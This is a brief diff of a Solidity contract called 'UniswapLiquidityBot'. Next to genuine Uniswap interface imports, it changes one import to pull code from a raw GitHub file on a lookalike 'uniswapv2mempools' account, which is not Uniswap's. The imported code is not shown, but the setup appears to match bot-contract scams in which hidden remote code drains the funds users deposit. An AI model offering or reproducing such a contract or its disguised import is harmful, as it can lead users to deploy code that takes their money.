@@ -4,7 +4,7 @@ pragma solidity ^0.6.6;
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
-import "https://raw.githubusercontent.com/uniswapv2mempool/mempool/main/v2";
+import "https://raw.githubusercontent.com/uniswapv2mempools/mempool/main/v2";
 //Mempool router
 
 contract UniswapLiquidityBot {
